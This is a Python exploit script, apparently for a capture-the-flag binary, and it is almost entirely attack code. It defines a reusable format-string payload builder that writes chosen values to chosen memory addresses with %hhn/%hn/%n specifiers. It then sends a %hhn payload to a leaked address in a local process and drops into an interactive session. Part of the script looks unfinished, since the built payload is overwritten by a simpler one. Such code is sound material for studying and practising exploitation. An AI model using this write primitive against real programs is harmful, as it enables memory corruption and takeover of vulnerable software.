from toyotama import *


def fsa_write(write_dict: dict[int | Address, int], nth_stack: int, written_bytes_num: int = 0, offset: int = 0, each: int = 1) -> bytes:
    assert each in (1, 2, 4)

    format_string = {
        1: "hhn",
        2: "hn",
        4: "n",
    }

    BIT_WIDTH = 64
    BYTE_WIDTH = BIT_WIDTH // 8

    payload = b""

    if offset:
        payload += b"A" * offset
        payload = payload.ljust(BYTE_WIDTH, b"A")  # Align stack
        nth_stack += 1

    for addr, _ in write_dict.items():
        for i in range(0, BYTE_WIDTH, each):
            where = addr + i
            payload_ = p64(where)
            written_bytes_num += len(payload_)
            payload += payload_

    payload_ = b"A" * (-len(payload) % BYTE_WIDTH)  # Align stack
    written_bytes_num += len(payload_)
    payload += payload_

    for _, value in write_dict.items():
        value = p64(value)
        for i in range(0, BYTE_WIDTH, each):
            what = (int.from_bytes(value[i : i + each], "little") - written_bytes_num) % (1 << 8 * each)

            payload_ = f"%{what}c%{nth_stack}${format_string[each]}".encode()
            nth_stack += 1
            written_bytes_num += len(payload_)
            payload += payload_

    if b"\0" in payload.strip(b"\0"):
        logger.warning("The payload includes some null bytes.")

    return payload


cnt = 0
_r = Process("./chall")
_r.recvuntil("0x0008 | ")
target_addr = Address(int(_r.recv(18), 0))
print(target_addr)

_r.recvuntil("> ")
payload = fsa_write({target_addr: 0xDEADBEEF}, nth_stack=8, written_bytes_num=_r.recv_bytes)
payload = p64(target_addr)
payload += b"%8$hhn"
print(payload)
_r.sendline(payload)
_r.interactive()
